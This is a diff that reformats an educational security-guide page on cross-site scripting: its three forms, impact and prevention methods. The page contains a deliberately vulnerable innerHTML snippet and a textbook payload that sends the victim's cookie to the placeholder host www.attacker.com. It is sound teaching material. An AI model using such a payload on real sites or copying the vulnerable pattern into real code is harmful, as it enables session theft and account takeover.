@@ -23,25 +23,24 @@ malicious sites.
 
 ## Context
 
-<iframe width="100%" height="450"
-src="https://www.youtube.com/embed/IuzU4y-UjLw">
-</iframe>
+<iframe
+  width='100%'
+  height='450'
+  src='https://www.youtube.com/embed/IuzU4y-UjLw'
+></iframe>
 
 Automated tools can detect and
 exploit all three forms of XSS, and
 there are freely available exploitation
 frameworks.
 
-
 XSS is the second most prevalent issue in the
 OWASP Top 10, and is found in around two-thirds of
 all applications.
 
-
 Automated tools can find some XSS problems
 automatically, particularly in mature technologies
 such as PHP, J2EE / JSP, and ASP.NET.
-
 
 The impact of XSS is moderate for
 reflected and DOM XSS, and severe
@@ -56,21 +55,21 @@ victim.
 There are three forms of XSS, usually targeting users' browsers:
 
 - **Reflected XSS:** The application or API includes unvalidated and
-unescaped user input as part of HTML output. A successful
-attack can allow the attacker to execute arbitrary HTML and
-JavaScript in the victim’s browser. Typically the user will need to
-interact with some malicious link that points to an attackercontrolled page, such as malicious watering hole websites,
-advertisements, or similar.
+  unescaped user input as part of HTML output. A successful
+  attack can allow the attacker to execute arbitrary HTML and
+  JavaScript in the victim’s browser. Typically the user will need to
+  interact with some malicious link that points to an attackercontrolled page, such as malicious watering hole websites,
+  advertisements, or similar.
 
 - **Stored XSS:** The application or API stores unsanitized user
-input that is viewed at a later time by another user or an
-administrator. Stored XSS is often considered a high or critical
-risk.
+  input that is viewed at a later time by another user or an
+  administrator. Stored XSS is often considered a high or critical
+  risk.
 
 - **DOM XSS:** JavaScript frameworks, single-page applications, and
-APIs that dynamically include attacker-controllable data to a
-page are vulnerable to DOM XSS. Ideally, the application would
-not send attacker-controllable data to unsafe JavaScript APIs.
+  APIs that dynamically include attacker-controllable data to a
+  page are vulnerable to DOM XSS. Ideally, the application would
+  not send attacker-controllable data to unsafe JavaScript APIs.
 
 Typical XSS attacks include session stealing, account takeover,
 MFA bypass, DOM node replacement or defacement (such as
@@ -78,22 +77,23 @@ trojan login panels), attacks against the user's browser such as
 malicious software downloads, key logging, and other client-side
 attacks.
 
-
 ## Conceptual Attacks
 
-### Scenario #1: 
+### Scenario #1:
+
 The application uses untrusted data in the
 construction of the following HTML snippet without validation or
 escaping:
 
 ```js
-const urlParams = new URLSearchParams(window.location.search);
+const urlParams = new URLSearchParams(window.location.search)
 
 page.innerHTML += `<input name='creditcard' type='TEXT'
-value='${urlParams.get("CC")}'>`;
+value='${urlParams.get('CC')}'>`
 ```
 
 The attacker modifies the ‘CC’ parameter in the browser to:
+
 ```
 '><script>document.location=
 'http://www.attacker.com/cgi-bin/cookie.cgi?
@@ -107,43 +107,42 @@ current session.
 Note: Attackers can use XSS to defeat any automated CrossSite Request Forgery (CSRF) defense the application might
 employ.
 
-
 ## Example Attack Scenarios
 
 ### Please review
+
 - The [Explained attack: Cross-site scripting (XSS) in this guide](/attacks_explained/cross-site_scripting_xss)
-    - [Reflected XSS](/attacks_explained/cross-site_scripting_xss#reflected-xss)
-    - [Stored XSS](/attacks_explained/cross-site_scripting_xss#stored-xss)
-    - [DOM XSS](/attacks_explained/cross-site_scripting_xss#dom-xss)
+  - [Reflected XSS](/attacks_explained/cross-site_scripting_xss#reflected-xss)
+  - [Stored XSS](/attacks_explained/cross-site_scripting_xss#stored-xss)
+  - [DOM XSS](/attacks_explained/cross-site_scripting_xss#dom-xss)
 - The [Explained attack: Cross Site Request Forgery (CSRF) in this guide](/attacks_explained/cross_site_request_forgery_csrf)
 - The [Explained attack: Server-Side Request Forgery (SSRF) in this guide](/attacks_explained/server-side_request_forgery_ssrf)
-
 
 ## How to Prevent
 
 Preventing XSS requires separation of untrusted data from
 active browser content. This can be achieved by:
-- Using frameworks that automatically escape XSS by design,
-such as the latest Ruby on Rails, React JS. Learn the
-limitations of each framework's XSS protection and
-appropriately handle the use cases which are not covered.
-- Escaping untrusted HTTP request data based on the context in
-the HTML output (body, attribute, JavaScript, CSS, or URL) will
-resolve Reflected and Stored XSS vulnerabilities. The OWASP
-[Cheat Sheet 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) has details on the required data
-escaping techniques.
-- Applying context-sensitive encoding when modifying the
-browser document on the client side acts against DOM XSS.
-When this cannot be avoided, similar context sensitive
-escaping techniques can be applied to browser APIs as
-described in the [OWASP Cheat Sheet 'DOM based XSS
-Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
-- Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is a defense-in-depth
-mitigating control against XSS. It is effective if no other
-vulnerabilities exist that would allow placing malicious code via
-local file includes (e.g. path traversal overwrites or vulnerable
-libraries from permitted content delivery networks).
 
+- Using frameworks that automatically escape XSS by design,
+  such as the latest Ruby on Rails, React JS. Learn the
+  limitations of each framework's XSS protection and
+  appropriately handle the use cases which are not covered.
+- Escaping untrusted HTTP request data based on the context in
+  the HTML output (body, attribute, JavaScript, CSS, or URL) will
+  resolve Reflected and Stored XSS vulnerabilities. The OWASP
+  [Cheat Sheet 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) has details on the required data
+  escaping techniques.
+- Applying context-sensitive encoding when modifying the
+  browser document on the client side acts against DOM XSS.
+  When this cannot be avoided, similar context sensitive
+  escaping techniques can be applied to browser APIs as
+  described in the [OWASP Cheat Sheet 'DOM based XSS
+  Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
+- Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is a defense-in-depth
+  mitigating control against XSS. It is effective if no other
+  vulnerabilities exist that would allow placing malicious code via
+  local file includes (e.g. path traversal overwrites or vulnerable
+  libraries from permitted content delivery networks).
 
 ## Hacking Playground
 
